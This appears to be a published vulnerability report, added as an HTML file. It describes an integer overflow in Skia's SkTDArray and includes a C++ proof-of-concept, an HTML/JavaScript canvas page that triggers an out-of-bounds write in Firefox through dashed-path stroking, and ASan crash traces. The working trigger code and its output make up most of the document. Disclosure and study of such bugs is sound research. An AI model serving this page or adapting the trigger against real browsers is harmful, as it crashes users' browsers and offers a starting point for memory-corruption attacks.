@@ -1,0 +1,193 @@
+<!--
+Skia bug report: https://bugs.chromium.org/p/skia/issues/detail?id=7674
+Mozilla bug report: https://bugzilla.mozilla.org/show_bug.cgi?id=1441941
+
+
+In Skia, SkTDArray stores length (fCount) and capacity (fReserve) as 32-bit ints and does not perform any integer overflow checks. There are a couple of places where an integer overflow could occur:
+
+(1) https://cs.chromium.org/chromium/src/third_party/skia/include/private/SkTDArray.h?rcl=a93a14a99816d25b773f0b12868143702baf44bf&l=369
+(2) https://cs.chromium.org/chromium/src/third_party/skia/include/private/SkTDArray.h?rcl=a93a14a99816d25b773f0b12868143702baf44bf&l=382
+(3) https://cs.chromium.org/chromium/src/third_party/skia/include/private/SkTDArray.h?rcl=a93a14a99816d25b773f0b12868143702baf44bf&l=383
+
+and possibly others
+
+In addition, on 32-bit systems, multiplication integer overflows could occur in several places where expressions such as
+
+fReserve * sizeof(T)
+sizeof(T) * count
+
+etc. are used.
+
+An integer overflow in (2) above is especially dangerous as it will cause too little memory to be allocated to hold the array which will cause a out-of-bounds write when e.g. appending an element.
+
+I have successfully demonstrated the issue by causing an overflow in fPts array in SkPathMeasure (https://cs.chromium.org/chromium/src/third_party/skia/include/core/SkPathMeasure.h?l=104&rcl=23d97760248300b7aec213a36f8b0485857240b5) which is used when rendering dashed paths.
+
+The PoC requires a lot of memory (My estimate is 16+1 GB for storing the path, additional 16GB for the SkTDArray we are corrupting), however there might be less demanding paths for triggering SkTDArray integer overflows.
+
+PoC program for Skia
+
+=================================================================
+
+#include <stdio.h>
+
+#include "SkCanvas.h"
+#include "SkPath.h"
+#include "SkGradientShader.h"
+#include "SkBitmap.h"
+#include "SkDashPathEffect.h"
+
+int main (int argc, char * const argv[]) {
+
+    SkBitmap bitmap;
+    bitmap.allocN32Pixels(500, 500);
+
+    //Create Canvas
+    SkCanvas canvas(bitmap);
+
+    SkPaint p;
+    p.setAntiAlias(false);
+    float intervals[] = { 0, 10e9f };
+    p.setStyle(SkPaint::kStroke_Style);
+    p.setPathEffect(SkDashPathEffect::Make(intervals, SK_ARRAY_COUNT(intervals), 0));
+
+    SkPath path;
+    
+    unsigned quadraticarr[] = {13, 68, 258, 1053, 1323, 2608, 10018, 15668, 59838, 557493, 696873, 871098, 4153813, 15845608, 48357008, 118059138, 288230353, 360287948, 562949933, 703687423, 1099511613, 0};
+    path.moveTo(0, 0);
+    unsigned numpoints = 1;
+    unsigned i = 1;
+    unsigned qaindex = 0;
+    while(numpoints < 2147483647) {
+      if(numpoints == quadraticarr[qaindex]) {
+        path.quadTo(i, 0, i, 0);
+        qaindex++;
+        numpoints += 2;
+      } else {
+        path.lineTo(i, 0);
+        numpoints += 1;
+      }
+      i++;
+      if(i == 1000000) {
+        path.moveTo(0, 0);
+        numpoints += 1;
+        i = 1;
+      }
+    }
+
+    printf("done building path\n");
+
+    canvas.drawPath(path, p);
+
+    return 0;
+}
+
+=================================================================
+
+ASan output:
+
+ASAN:DEADLYSIGNAL
+=================================================================
+==39779==ERROR: AddressSanitizer: SEGV on unknown address 0x7fefc321c7d8 (pc 0x7ff2dac9cf66 bp 0x7ffcb5a46540 sp 0x7ffcb5a45cc8 T0)
+    #0 0x7ff2dac9cf65  (/lib/x86_64-linux-gnu/libc.so.6+0x83f65)
+    #1 0x7bb66c in __asan_memcpy (/usr/local/google/home/ifratric/p0/skia/skia/out/asan/SkiaSDLExample+0x7bb66c)
+    #2 0xcb2a33 in SkTDArray<SkPoint>::append(int, SkPoint const*) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../include/private/../private/SkTDArray.h:184:17
+    #3 0xcb8b9a in SkPathMeasure::buildSegments() /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkPathMeasure.cpp:341:21
+    #4 0xcbb5f4 in SkPathMeasure::getLength() /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkPathMeasure.cpp:513:9
+    #5 0xcbb5f4 in SkPathMeasure::nextContour() /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkPathMeasure.cpp:688
+    #6 0x1805c14 in SkDashPath::InternalFilter(SkPath*, SkPath const&, SkStrokeRec*, SkRect const*, float const*, int, float, int, float, SkDashPath::StrokeRecApplication) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/utils/SkDashPath.cpp:482:14
+    #7 0xe9cf60 in SkDashImpl::filterPath(SkPath*, SkPath const&, SkStrokeRec*, SkRect const*) const /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/effects/SkDashPathEffect.cpp:40:12
+    #8 0xc8fbef in SkPaint::getFillPath(SkPath const&, SkPath*, SkRect const*, float) const /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkPaint.cpp:1500:24
+    #9 0xbdbc26 in SkDraw::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool, bool, SkBlitter*, SkInitOnceData*) const /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkDraw.cpp:1120:18
+    #10 0x169b16e in SkDraw::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool) const /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkDraw.h:58:9
+    #11 0x169b16e in SkBitmapDevice::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkBitmapDevice.cpp:226
+    #12 0xb748d1 in SkCanvas::onDrawPath(SkPath const&, SkPaint const&) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkCanvas.cpp:2167:9
+    #13 0xb6b01a in SkCanvas::drawPath(SkPath const&, SkPaint const&) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkCanvas.cpp:1757:5
+    #14 0x8031dc in main /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../example/SkiaSDLExample.cpp:49:5
+    #15 0x7ff2dac392b0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202b0)
+    #16 0x733519 in _start (/usr/local/google/home/ifratric/p0/skia/skia/out/asan/SkiaSDLExample+0x733519)
+
+The issue can also be triggered via the web in Mozilla Firefox
+
+PoC for Mozilla Firefox on Linux (I used Firefox ASan build from https://developer.mozilla.org/en-US/docs/Mozilla/Testing/Firefox_and_Address_Sanitizer)
+
+=================================================================
+-->
+
+<canvas id="canvas" width="64" height="64"></canvas>
+<br>
+<button onclick="go()">go</button>
+<script>
+var canvas = document.getElementById("canvas");
+var ctx = canvas.getContext("2d");
+
+function go() {
+  ctx.beginPath();
+
+  ctx.mozImageSmoothingEnabled = false;
+  ctx.webkitImageSmoothingEnabled = false;
+  ctx.msImageSmoothingEnabled = false;
+  ctx.imageSmoothingEnabled = false;
+
+  linedasharr = [0, 1e+37];
+  ctx.setLineDash(linedasharr);
+
+  quadraticarr = [13, 68, 258, 1053, 1323, 2608, 10018, 15668, 59838, 557493, 696873, 871098, 4153813, 15845608, 48357008, 118059138, 288230353, 360287948, 562949933, 703687423, 1099511613];
+  ctx.moveTo(0, 0);
+  numpoints = 1;
+  i = 1;
+  qaindex = 0;
+  while(numpoints < 2147483647) {
+    if(numpoints == quadraticarr[qaindex]) {
+      ctx.quadraticCurveTo(i, 0, i, 0);
+      qaindex++;
+      numpoints += 2;
+    } else {
+      ctx.lineTo(i, 0);
+      numpoints += 1;
+    }
+    i++;
+    if(i == 1000000) {
+      ctx.moveTo(0, 0);
+      numpoints += 1;
+      i = 1;
+    }
+  }
+
+  alert("done building path");
+
+  ctx.stroke();
+
+  alert("exploit failed");
+}
+
+</script>
+
+<!--
+=================================================================
+
+ASan output:
+
+AddressSanitizer:DEADLYSIGNAL
+=================================================================
+==37732==ERROR: AddressSanitizer: SEGV on unknown address 0x7ff86d20e7d8 (pc 0x7ff7c1233701 bp 0x7fffd19dd5f0 sp 0x7fffd19dd420 T0)
+==37732==The signal is caused by a WRITE memory access.
+    #0 0x7ff7c1233700 in append /builds/worker/workspace/build/src/gfx/skia/skia/include/core/../private/SkTDArray.h:184:17
+    #1 0x7ff7c1233700 in SkPathMeasure::buildSegments() /builds/worker/workspace/build/src/gfx/skia/skia/src/core/SkPathMeasure.cpp:342
+    #2 0x7ff7c1235be1 in getLength /builds/worker/workspace/build/src/gfx/skia/skia/src/core/SkPathMeasure.cpp:516:15
+    #3 0x7ff7c1235be1 in SkPathMeasure::nextContour() /builds/worker/workspace/build/src/gfx/skia/skia/src/core/SkPathMeasure.cpp:688
+    #4 0x7ff7c112905e in SkDashPath::InternalFilter(SkPath*, SkPath const&, SkStrokeRec*, SkRect const*, float const*, int, float, int, float, SkDashPath::StrokeRecApplication) /builds/worker/workspace/build/src/gfx/skia/skia/src/utils/SkDashPath.cpp:307:19
+    #5 0x7ff7c0bf9ed0 in SkDashPathEffect::filterPath(SkPath*, SkPath const&, SkStrokeRec*, SkRect const*) const /builds/worker/workspace/build/src/gfx/skia/skia/src/effects/SkDashPathEffect.cpp:40:12
+    #6 0x7ff7c1210ed6 in SkPaint::getFillPath(SkPath const&, SkPath*, SkRect const*, float) const /builds/worker/workspace/build/src/gfx/skia/skia/src/core/SkPaint.cpp:1969:37
+    #7 0x7ff7c0ec9156 in SkDraw::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool, bool, SkBlitter*) const /builds/worker/workspace/build/src/gfx/skia/skia/src/core/SkDraw.cpp:1141:25
+    #8 0x7ff7c0b8de4b in drawPath /builds/worker/workspace/build/src/gfx/skia/skia/src/core/SkDraw.h:55:15
+    #9 0x7ff7c0b8de4b in SkBitmapDevice::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool) /builds/worker/workspace/build/src/gfx/skia/skia/src/core/SkBitmapDevice.cpp:235
+    #10 0x7ff7c0bbc691 in SkCanvas::onDrawPath(SkPath const&, SkPaint const&) /builds/worker/workspace/build/src/gfx/skia/skia/src/core/SkCanvas.cpp:2227:23
+    #11 0x7ff7b86965b4 in mozilla::gfx::DrawTargetSkia::Stroke(mozilla::gfx::Path const*, mozilla::gfx::Pattern const&, mozilla::gfx::StrokeOptions const&, mozilla::gfx::DrawOptions const&) /builds/worker/workspace/build/src/gfx/2d/DrawTargetSkia.cpp:829:12
+    #12 0x7ff7bbd34dcc in mozilla::dom::CanvasRenderingContext2D::Stroke() /builds/worker/workspace/build/src/dom/canvas/CanvasRenderingContext2D.cpp:3562:11
+    #13 0x7ff7ba9b0701 in mozilla::dom::CanvasRenderingContext2DBinding::stroke(JSContext*, JS::Handle<JSObject*>, mozilla::dom::CanvasRenderingContext2D*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/CanvasRenderingContext2DBinding.cpp:3138:13
+    #14 0x7ff7bbc3b4d1 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3031:13
+    #15 0x7ff7c26ae3b8 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:290:15
+    #16 0x7ff7c26ae3b8 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:467
+    #17 0x7ff7c28ecd17 in js::jit::DoCallFallback(JSContext*, js::jit::BaselineFrame*, js::jit::ICCall_Fallback*, unsigned int, JS::Value*, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jit/BaselineIC.cpp:2383:14
+    #18 0x1a432b56061a  (<unknown module>)
+-->
